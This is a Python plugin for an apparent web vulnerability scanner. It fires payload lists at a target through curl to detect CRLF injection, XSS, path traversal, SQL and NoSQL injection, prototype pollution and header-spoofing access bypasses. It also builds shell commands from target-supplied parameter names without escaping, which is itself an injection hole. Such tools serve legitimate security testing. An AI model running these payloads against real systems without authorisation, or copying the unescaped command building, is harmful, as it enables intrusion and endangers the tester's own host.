"""
plugins/fuzzer.py — Advanced Parameter & Header Fuzzer

Techniques:
  1.  GET/POST parameter fuzzing (boundary, special chars, encoding)
  2.  HTTP header injection (Host, X-Forwarded-For, Referer, User-Agent)
  3.  JSON parameter fuzzing
  4.  Numeric boundary & overflow testing (CWE-190)
  5.  Encoding bypass (double URL, Unicode, HTML entities)
  6.  Verb tampering (GET→POST→PUT→PATCH)
  7.  HTTP Parameter Pollution (HPP)
  8.  Null byte injection (CWE-626)
  9.  CRLF injection (CWE-113)
  10. Format string detection (CWE-134)
"""

import re
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed

from core.banner import print_status, print_finding, print_table, C
from utils.shell import run_cmd

# ── Fuzz wordlists ────────────────────────────────────────────────────────────

BOUNDARY_PAYLOADS = [
    ("0",             "zero"),
    ("-1",            "negative int"),
    ("99999999999999","large int"),
    ("2147483648",    "INT_MAX+1 overflow"),
    ("-2147483649",   "INT_MIN-1 overflow"),
    ("0.0",           "float zero"),
    ("1e308",         "float overflow"),
    ("NaN",           "NaN"),
    ("Infinity",      "Infinity"),
    ("null",          "null"),
    ("undefined",     "undefined"),
    ("true",          "boolean true"),
    ("false",         "boolean false"),
    ("[]",            "empty array JSON"),
    ("{}",            "empty object JSON"),
    ("''",            "empty string single quote"),
    ('""',            "empty string double quote"),
    (" ",             "single space"),
    ("\t",            "tab character"),
    ("\n",            "newline"),
    ("\r\n",          "CRLF"),
    ("%00",           "null byte URL encoded"),
    ("../",           "path traversal fragment"),
    ("~",             "tilde"),
    ("*",             "wildcard"),
    ("{{}}",          "empty template expression"),
]

HEADER_INJECTION_PAYLOADS = {
    "X-Forwarded-For":    ["127.0.0.1","::1","0.0.0.0","169.254.169.254","localhost"],
    "X-Real-IP":          ["127.0.0.1","::1"],
    "X-Originating-IP":   ["127.0.0.1"],
    "X-Remote-IP":        ["127.0.0.1"],
    "X-Client-IP":        ["127.0.0.1"],
    "Forwarded":          ["for=127.0.0.1","for=\"[::1]\""],
    "Host":               ["localhost","127.0.0.1","internal.company.com","169.254.169.254"],
    "X-Host":             ["localhost","127.0.0.1"],
    "Referer":            ["http://127.0.0.1/admin","http://internal/"],
    "Origin":             ["http://localhost","null","http://127.0.0.1"],
    "X-Custom-IP-Authorization": ["127.0.0.1"],
    "X-Forward-For":      ["127.0.0.1"],
    "True-Client-IP":     ["127.0.0.1","169.254.169.254"],
}

CRLF_PAYLOADS = [
    "%0d%0aSet-Cookie:crlfinjected=true",
    "%0aSet-Cookie:crlfinjected=true",
    "\r\nSet-Cookie:crlfinjected=true",
    "%0d%0aContent-Length:0%0d%0a%0d%0a",
    "%E5%98%8A%E5%98%8DSet-Cookie:crlfinjected=true",
]

FORMAT_STRING_PAYLOADS = [
    "%s%s%s%s",
    "%x%x%x%x",
    "%n%n%n%n",
    "%.99999s",
    "%p%p%p%p",
    "AAAA%p%p%p%p%p",
    "{0}{0}{0}",
]

ENCODING_BYPASS = [
    ("<script>",       urllib.parse.quote("<script>"),      "URL encoded"),
    ("<script>",       urllib.parse.quote(urllib.parse.quote("<script>")), "Double URL encoded"),
    ("<script>",       "&#60;script&#62;",                  "HTML entities"),
    ("<script>",       "\\u003cscript\\u003e",               "Unicode escape"),
    ("../etc/passwd",  "..%c0%afetc%c0%afpasswd",           "Overlong UTF-8"),
    ("../etc/passwd",  "%2e%2e%2fetc%2fpasswd",             "URL encoded"),
]

NULL_BYTE_TARGETS = [
    "%00",        "\\0",      "\x00",
    "%00.jpg",    "test%00.php",
]

JSON_FUZZ_TEMPLATE = [
    '{"key": "value\' OR \'1\'=\'1"}',
    '{"key": "<script>alert(1)</script>"}',
    '{"key": "../../../etc/passwd"}',
    '{"key": {"$gt": ""}}',           # NoSQL injection
    '{"key": {"$ne": null}}',         # NoSQL injection
    '{"key": {"$where": "1==1"}}',    # NoSQL injection
    '{"__proto__": {"admin": true}}', # Prototype pollution
    '{"constructor": {"prototype": {"admin": true}}}',
]


def run(args, verbose=False):
    results  = {}
    target   = getattr(args, "target", "127.0.0.1")
    port     = int(getattr(args, "port", 80))
    scheme   = "https" if port in (443, 8443) else "http"
    base_url = f"{scheme}://{target}:{port}"

    print_status(f"Fuzzer target: {base_url}", "info")

    # Collect endpoints and parameters to fuzz
    params = _collect_fuzz_targets(base_url, verbose)

    _fuzz_boundaries(results, base_url, params, verbose)
    _fuzz_headers(results, base_url, verbose)
    _fuzz_crlf(results, base_url, params, verbose)
    _fuzz_null_byte(results, base_url, params, verbose)
    _fuzz_format_string(results, base_url, params, verbose)
    _fuzz_encoding_bypass(results, base_url, params, verbose)
    _fuzz_verb_tamper(results, base_url, verbose)
    _fuzz_hpp(results, base_url, params, verbose)
    _fuzz_json(results, base_url, verbose)
    _fuzz_nosql(results, base_url, params, verbose)
    _fuzz_prototype_pollution(results, base_url, verbose)

    _print_summary(results)
    return results


# ── Target Collection ─────────────────────────────────────────────────────────

def _collect_fuzz_targets(base_url, verbose):
    rc, body = run_cmd(f"curl -sk -m10 '{base_url}/' 2>/dev/null", timeout=14)
    params = []

    # Extract GET params from hrefs
    hrefs = re.findall(r'href=["\']([^"\']+\?[^"\']+)', body, re.IGNORECASE)
    for href in hrefs[:15]:
        parsed = urllib.parse.urlparse(href)
        for key in urllib.parse.parse_qs(parsed.query):
            base = f"{base_url}{parsed.path}" if href.startswith("/") else href.split("?")[0]
            params.append({"url": base, "param": key, "method": "GET"})

    # Extract form inputs
    forms = re.findall(r'<form[^>]*action=["\']?([^"\'> ]+)[^>]*>(.*?)</form>',
                       body, re.IGNORECASE | re.DOTALL)
    for action, form_body in forms[:5]:
        url = f"{base_url}{action}" if action.startswith("/") else f"{base_url}/{action}"
        for name in re.findall(r'<input[^>]*name=["\']([^"\']+)["\']', form_body):
            params.append({"url": url, "param": name, "method": "POST"})

    # Add generic params
    for p in ["id","q","search","name","user","page","file","path","data"]:
        params.append({"url": f"{base_url}/", "param": p, "method": "GET"})

    # Deduplicate
    seen, unique = set(), []
    for p in params:
        k = (p["url"], p["param"])
        if k not in seen:
            seen.add(k)
            unique.append(p)

    print_status(f"Fuzz targets: {len(unique)} parameter(s) collected.", "info")
    return unique[:40]


# ── Boundary Testing (CWE-190, CWE-20) ───────────────────────────────────────

def _fuzz_boundaries(results, base_url, params, verbose):
    print_status("Fuzzing boundary values (CWE-190 / CWE-20)…", "info")
    anomalies = []

    # Get baseline
    rc0, base_resp = run_cmd(f"curl -sk -m8 '{base_url}/' 2>/dev/null", timeout=10)
    base_len = len(base_resp)

    def fuzz_one(p, payload, desc):
        enc = urllib.parse.quote(str(payload))
        if p["method"] == "GET":
            url = f"{p['url']}?{p['param']}={enc}"
            rc, resp = run_cmd(f"curl -sk -m8 -o /dev/null -w '%{{http_code}}' '{url}' 2>/dev/null", timeout=8)
        else:
            rc, resp = run_cmd(
                f"curl -sk -m8 -X POST -d '{p['param']}={enc}' "
                f"-o /dev/null -w '%{{http_code}}' '{p['url']}' 2>/dev/null", timeout=8
            )
        code = resp.strip()
        if code in ("500","503","502"):
            return {"param": p["param"], "url": p["url"],
                    "payload": payload, "desc": desc, "code": code}
        return None

    with ThreadPoolExecutor(max_workers=8) as ex:
        futures = []
        for p in params[:10]:
            for payload, desc in BOUNDARY_PAYLOADS[:12]:
                futures.append(ex.submit(fuzz_one, p, payload, desc))
        for fut in as_completed(futures):
            r = fut.result()
            if r and not any(a["param"] == r["param"] for a in anomalies):
                anomalies.append(r)

    results["boundary_anomalies"] = anomalies
    if anomalies:
        print_finding(
            f"Boundary Fuzz Anomalies ({len(anomalies)} — server errors triggered)",
            "\n".join(f"  [MEDIUM] param={a['param']} payload='{a['payload']}' → HTTP {a['code']}"
                      for a in anomalies),
            "medium"
        )
    else:
        print_status("No server errors from boundary payloads.", "miss")


# ── Header Injection ──────────────────────────────────────────────────────────

def _fuzz_headers(results, base_url, verbose):
    print_status("Fuzzing HTTP headers for injection / IP bypass…", "info")
    findings = []

    # Get baseline response
    rc0, base_resp = run_cmd(
        f"curl -sk -m8 -o /dev/null -w '%{{http_code}}' '{base_url}/admin' 2>/dev/null",
        timeout=10
    )
    base_code = base_resp.strip()

    for header, values in HEADER_INJECTION_PAYLOADS.items():
        for val in values[:2]:
            rc, resp = run_cmd(
                f"curl -sk -m8 -H '{header}: {val}' "
                f"-o /dev/null -w '%{{http_code}}' '{base_url}/admin' 2>/dev/null",
                timeout=8
            )
            code = resp.strip()
            # If we get 200 on /admin with spoofed IP but it was 403 before
            if code == "200" and base_code in ("401","403","302"):
                findings.append({
                    "header": header, "value": val,
                    "base_code": base_code, "bypass_code": code,
                    "path": "/admin"
                })

    results["header_injection"] = findings
    if findings:
        print_finding(
            f"HTTP Header Injection / IP Bypass ({len(findings)})",
            "\n".join(f"  [HIGH] {f['header']}: {f['value']} → {f['base_code']} became {f['bypass_code']}"
                      for f in findings),
            "high"
        )
    else:
        print_status("No header injection / IP bypass found.", "miss")


# ── CRLF Injection (CWE-113) ─────────────────────────────────────────────────

def _fuzz_crlf(results, base_url, params, verbose):
    print_status("Testing CRLF injection — CWE-113…", "info")
    findings = []

    for p in params[:8]:
        for payload in CRLF_PAYLOADS[:3]:
            if p["method"] == "GET":
                url = f"{p['url']}?{p['param']}={payload}"
                rc, resp = run_cmd(
                    f"curl -sk -m8 -D - -o /dev/null '{url}' 2>/dev/null | head -30",
                    timeout=10
                )
            else:
                rc, resp = run_cmd(
                    f"curl -sk -m8 -D - -o /dev/null "
                    f"-X POST -d '{p['param']}={payload}' '{p['url']}' 2>/dev/null | head -30",
                    timeout=10
                )
            if "crlfinjected" in resp.lower() or "set-cookie: crlfinjected" in resp.lower():
                findings.append({
                    "url":     p["url"],
                    "param":   p["param"],
                    "payload": payload,
                    "cwe":     "CWE-113"
                })
                break

    results["crlf"] = findings
    if findings:
        print_finding(
            f"CRLF Injection — CWE-113 ({len(findings)})",
            "\n".join(f"  [HIGH] {f['url']} | param={f['param']}" for f in findings),
            "high"
        )
    else:
        print_status("No CRLF injection detected.", "miss")


# ── Null Byte Injection (CWE-626) ─────────────────────────────────────────────

def _fuzz_null_byte(results, base_url, params, verbose):
    print_status("Testing null byte injection — CWE-626…", "info")
    findings = []

    file_params = [p for p in params if any(
        kw in p["param"].lower() for kw in ["file","path","page","doc","name","ext"]
    )]

    for p in (file_params or params[:5]):
        for nb in NULL_BYTE_TARGETS[:3]:
            test_val = f"test{nb}"
            url = f"{p['url']}?{p['param']}={urllib.parse.quote(test_val)}"
            rc, resp = run_cmd(f"curl -sk -m8 '{url}' 2>/dev/null", timeout=10)
            if any(sig in resp for sig in ["root:x:","[fonts]","File not found"]):
                findings.append({"url": p["url"], "param": p["param"],
                                  "payload": test_val, "cwe": "CWE-626"})
                break

    results["null_byte"] = findings
    if findings:
        print_finding(
            f"Null Byte Injection — CWE-626 ({len(findings)})",
            "\n".join(f"  [HIGH] {f['url']} | param={f['param']}" for f in findings),
            "high"
        )
    else:
        print_status("No null byte injection detected.", "miss")


# ── Format String (CWE-134) ───────────────────────────────────────────────────

def _fuzz_format_string(results, base_url, params, verbose):
    print_status("Testing format string vulnerabilities — CWE-134…", "info")
    findings = []

    for p in params[:10]:
        for payload in FORMAT_STRING_PAYLOADS[:4]:
            enc = urllib.parse.quote(payload)
            url = f"{p['url']}?{p['param']}={enc}"
            rc, resp = run_cmd(f"curl -sk -m8 '{url}' 2>/dev/null", timeout=10)
            # Format string leak: hex addresses in response
            if re.search(r'0x[0-9a-f]{4,}', resp) or "segfault" in resp.lower():
                findings.append({"url": p["url"], "param": p["param"],
                                  "payload": payload, "cwe": "CWE-134"})
                break

    results["format_string"] = findings
    if findings:
        print_finding(
            f"Format String — CWE-134 ({len(findings)})",
            "\n".join(f"  [HIGH] {f['url']} | param={f['param']}" for f in findings),
            "high"
        )
    else:
        print_status("No format string indicators detected.", "miss")


# ── Encoding Bypass ───────────────────────────────────────────────────────────

def _fuzz_encoding_bypass(results, base_url, params, verbose):
    print_status("Testing encoding bypass techniques…", "info")
    findings = []

    for p in params[:8]:
        for orig, encoded, desc in ENCODING_BYPASS:
            url = f"{p['url']}?{p['param']}={encoded}"
            rc, resp = run_cmd(f"curl -sk -m8 '{url}' 2>/dev/null", timeout=10)
            # Check if original payload appears decoded in response
            if orig in resp or orig.replace("<","").replace(">","") in resp:
                findings.append({"url": p["url"], "param": p["param"],
                                  "technique": desc, "payload": encoded})
                break

    results["encoding_bypass"] = findings
    if findings:
        print_finding(
            f"Encoding Bypass ({len(findings)})",
            "\n".join(f"  [MEDIUM] {f['url']} | {f['technique']}" for f in findings),
            "medium"
        )
    else:
        print_status("No encoding bypasses detected.", "miss")


# ── Verb Tampering ────────────────────────────────────────────────────────────

def _fuzz_verb_tamper(results, base_url, verbose):
    print_status("Testing HTTP verb tampering on restricted paths…", "info")
    restricted_paths = ["/admin", "/api/admin", "/config", "/internal",
                        "/dashboard", "/manage", "/system"]
    findings = []

    for path in restricted_paths[:5]:
        # Baseline GET
        rc0, base_code = run_cmd(
            f"curl -sk -m5 -o /dev/null -w '%{{http_code}}' '{base_url}{path}' 2>/dev/null",
            timeout=8
        )
        if base_code.strip() not in ("401","403"):
            continue

        for verb in ["POST","PUT","PATCH","HEAD","OPTIONS","TRACE","ARBITRARY"]:
            rc, code = run_cmd(
                f"curl -sk -m5 -X {verb} -o /dev/null -w '%{{http_code}}' "
                f"'{base_url}{path}' 2>/dev/null",
                timeout=8
            )
            if code.strip() == "200":
                findings.append({
                    "path":    path,
                    "method":  verb,
                    "base":    base_code.strip(),
                    "bypass":  code.strip()
                })

    results["verb_tamper"] = findings
    if findings:
        print_finding(
            f"HTTP Verb Tampering ({len(findings)})",
            "\n".join(f"  [HIGH] {base_url}{f['path']} — {f['method']} bypasses {f['base']}"
                      for f in findings),
            "high"
        )
    else:
        print_status("No verb tampering bypasses found.", "miss")


# ── HTTP Parameter Pollution ──────────────────────────────────────────────────

def _fuzz_hpp(results, base_url, params, verbose):
    print_status("Testing HTTP Parameter Pollution (HPP)…", "info")
    findings = []

    for p in params[:8]:
        # Duplicate the parameter with different values
        url = f"{p['url']}?{p['param']}=safe&{p['param']}=<script>alert(1)</script>"
        rc, resp = run_cmd(f"curl -sk -m8 '{url}' 2>/dev/null", timeout=10)
        if "<script>alert(1)</script>" in resp:
            findings.append({"url": p["url"], "param": p["param"]})

    results["hpp"] = findings
    if findings:
        print_finding(
            f"HTTP Parameter Pollution ({len(findings)})",
            "\n".join(f"  [MEDIUM] {f['url']} | param={f['param']}" for f in findings),
            "medium"
        )
    else:
        print_status("No HPP vulnerabilities detected.", "miss")


# ── JSON Fuzzing ──────────────────────────────────────────────────────────────

def _fuzz_json(results, base_url, verbose):
    print_status("Fuzzing JSON API endpoints…", "info")
    findings = []
    api_paths = ["/api", "/api/v1", "/api/v2", "/graphql", "/json"]

    for path in api_paths:
        for payload in JSON_FUZZ_TEMPLATE[:5]:
            rc, resp = run_cmd(
                f"curl -sk -m8 -X POST "
                f"-H 'Content-Type: application/json' "
                f"-d '{payload}' '{base_url}{path}' 2>/dev/null",
                timeout=10
            )
            resp_low = resp.lower()
            # SQL error in JSON response
            if any(sig in resp_low for sig in ["sql","syntax error","sqlstate","ora-"]):
                findings.append({"path": path, "payload": payload[:50],
                                  "type": "SQL error in JSON API"})
            # NoSQL response
            elif '"$' in payload and ('"_id"' in resp or '"__v"' in resp):
                findings.append({"path": path, "payload": payload[:50],
                                  "type": "NoSQL injection — MongoDB response field"})

    results["json_fuzz"] = findings
    if findings:
        print_finding(
            f"JSON API Fuzzing Findings ({len(findings)})",
            "\n".join(f"  [HIGH] {base_url}{f['path']} — {f['type']}" for f in findings),
            "high"
        )
    else:
        print_status("No JSON API injection findings.", "miss")


# ── NoSQL Injection ───────────────────────────────────────────────────────────

def _fuzz_nosql(results, base_url, params, verbose):
    print_status("Testing NoSQL injection (CWE-943)…", "info")
    findings = []
    nosql_payloads = [
        ("[$gt]","",   "MongoDB greater-than operator in param"),
        ("[$ne]","0",  "MongoDB not-equal operator"),
        ("[$regex]",".*","MongoDB regex bypass"),
        ("[$where]","this.password.match(/.*/)","MongoDB where injection"),
    ]

    for p in params[:10]:
        for suffix, val, desc in nosql_payloads:
            param_name = f"{p['param']}{suffix}"
            url = f"{p['url']}?{param_name}={urllib.parse.quote(val)}"
            rc, resp = run_cmd(f"curl -sk -m8 '{url}' 2>/dev/null", timeout=10)
            # If we get data back (non-empty JSON), flag it
            if resp.strip().startswith("{") or resp.strip().startswith("["):
                if len(resp) > 50:
                    findings.append({
                        "url":     p["url"],
                        "param":   param_name,
                        "payload": val,
                        "desc":    desc
                    })
                    break

    results["nosql"] = findings
    if findings:
        print_finding(
            f"NoSQL Injection — CWE-943 ({len(findings)})",
            "\n".join(f"  [HIGH] {f['url']} | param={f['param']} — {f['desc']}"
                      for f in findings),
            "high"
        )
    else:
        print_status("No NoSQL injection detected.", "miss")


# ── Prototype Pollution ───────────────────────────────────────────────────────

def _fuzz_prototype_pollution(results, base_url, verbose):
    print_status("Testing prototype pollution (CWE-1321)…", "info")
    findings = []

    proto_payloads = [
        '{"__proto__":{"admin":true}}',
        '{"constructor":{"prototype":{"admin":true}}}',
        '{"__proto__.admin":true}',
    ]

    api_paths = ["/api", "/api/v1", "/login", "/user", "/profile"]
    for path in api_paths:
        for payload in proto_payloads:
            rc, resp = run_cmd(
                f"curl -sk -m8 -X POST "
                f"-H 'Content-Type: application/json' "
                f"-d '{payload}' '{base_url}{path}' 2>/dev/null",
                timeout=10
            )
            # Check for admin escalation response
            if '"admin":true' in resp or '"role":"admin"' in resp:
                findings.append({"path": path, "payload": payload[:80]})
                break

    results["proto_pollution"] = findings
    if findings:
        print_finding(
            f"Prototype Pollution — CWE-1321 ({len(findings)})",
            "\n".join(f"  [CRITICAL] {base_url}{f['path']}" for f in findings),
            "critical"
        )
    else:
        print_status("No prototype pollution detected.", "miss")


# ── Summary ───────────────────────────────────────────────────────────────────

def _print_summary(results):
    total = sum(
        len(v) if isinstance(v, list) else 0
        for v in results.values()
    )
    print_status(
        f"Fuzzer complete — {total} anomalies across all fuzz categories.",
        "success" if total else "info"
    )
